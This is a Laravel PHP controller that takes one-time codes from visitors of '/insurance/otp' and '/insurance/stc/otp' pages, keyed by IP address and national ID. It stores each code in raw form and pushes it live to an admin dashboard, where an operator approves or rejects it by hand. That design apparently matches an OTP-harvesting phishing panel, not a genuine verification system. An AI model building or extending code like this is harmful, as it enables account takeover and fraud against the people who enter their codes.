<?php

namespace App\Http\Controllers;

use App\Events\CustomerActivityUpdated;
use App\Http\Requests\ResendOtpRequest;
use App\Http\Requests\SubmitOtpRequest;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use App\Services\CustomerCacheService;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Cache;

class CustomerOtpController extends Controller
{
    /**
     * Submit an OTP code for verification (creates a pending OTP record).
     * The admin dashboard will approve/reject it via WebSocket.
     *
     * POST /api/otp/submit
     */
    public function submit(SubmitOtpRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $ip = $request->ip();

        // Detect if submission is from STC OTP page
        $isStcOtp = ($validated['type'] ?? null) === 'stc_otp';
        $currentPage = $isStcOtp ? '/insurance/stc/otp' : '/insurance/otp';

        // Ensure customer profile exists
        $customer = CustomerProfile::createOrUpdateByIP($ip, array_filter([
            'current_page' => $currentPage,
            'national_id'  => $validated['national_id'] ?? null,
        ], fn($v) => $v !== null));

        // Determine the OTP type for storage
        $otpType = $isStcOtp ? 'stc_otp' : 'otp';
        $rawCode = $validated['otp'];

        // Idempotency + invalidation inside a transaction to prevent double-submit races
        $otp = \Illuminate\Support\Facades\DB::transaction(function () use ($customer, $otpType, $rawCode, $validated) {
            // Re-read with lock to prevent race between lockout check and concurrent rejection
            $locked = CustomerProfile::where('id', $customer->id)->lockForUpdate()->value('otp_locked_until');
            if ($locked && now()->lt($locked)) {
                return null; // signal lockout
            }

            // Check for an existing pending OTP of the same type created in the last 2 minutes (idempotent)
            $existing = OtpCode::where('customer_profile_id', $customer->id)
                ->ofType($otpType)
                ->pending()
                ->where('created_at', '>=', now()->subMinutes(2))
                ->lockForUpdate()
                ->first();

            if ($existing && hash('sha256', $existing->code) === hash('sha256', $rawCode)) {
                // Same code submitted again — return existing record
                return $existing;
            }

            // Invalidate any previous pending OTPs of the same type for this customer
            OtpCode::where('customer_profile_id', $customer->id)
                ->ofType($otpType)
                ->pending()
                ->update(['status' => 'rejected']);

            // Create new pending OTP with code hash + 5-minute expiry
            return OtpCode::create([
                'customer_profile_id' => $customer->id,
                'session_id' => $validated['session_id'] ?? null,
                'code' => $rawCode,
                'code_hash' => hash('sha256', $rawCode),
                'type' => $otpType,
                'status' => 'pending',
                'expires_at' => now()->addMinutes(5),
            ]);
        });

        // Handle lockout detected inside transaction
        if ($otp === null) {
            $remaining = now()->diffInMinutes($customer->fresh()->otp_locked_until, true) + 1;
            return response()->json([
                'success' => false,
                'message' => "تم تعليق الحساب مؤقتاً. حاول مرة أخرى بعد {$remaining} دقيقة",
                'locked' => true,
                'retry_after_minutes' => $remaining,
            ], 429);
        }

        // Notify admin dashboard in real-time
        CustomerCacheService::flush();
        try {
            broadcast(new CustomerActivityUpdated(
                $customer->id,
                $customer->ip_address,
                $customer->current_page,
                $customer->is_active,
                $isStcOtp ? 'stc_otp_submitted' : 'otp_submitted'
            ));
        } catch (\Throwable $e) {
            // Silent fail — broadcasting should never block the customer
        }

        return response()->json([
            'success' => true,
            'message' => 'تم إرسال رمز التحقق بنجاح',
            'otp_id' => $otp->id,
            'expires_at' => $otp->expires_at?->toIso8601String(),
            'status_sig' => hash_hmac('sha256', 'otp|' . ($validated['session_id'] ?? ''), config('services.status_poll.secret')),
        ]);
    }

    /**
     * Resend OTP — invalidates previous and creates a fresh record.
     *
     * POST /api/otp/resend
     */
    public function resend(ResendOtpRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $ip = $request->ip();

        // Ensure customer profile exists
        $customer = CustomerProfile::createOrUpdateByIP($ip, [
            'current_page' => '/insurance/otp',
        ]);

        // Invalidate all pending OTPs for this customer
        OtpCode::where('customer_profile_id', $customer->id)
            ->ofType('otp')
            ->pending()
            ->update(['status' => 'rejected']);

        // Notify admin dashboard that customer requested a new code
        CustomerCacheService::flush();
        try {
            broadcast(new CustomerActivityUpdated(
                $customer->id,
                $customer->ip_address,
                $customer->current_page,
                $customer->is_active,
                'otp_resend_requested'
            ));
        } catch (\Throwable $e) {
            // Silent — broadcasting should never block the customer
        }

        return response()->json([
            'success' => true,
            'message' => 'تم إعادة إرسال رمز التحقق',
        ]);
    }
}
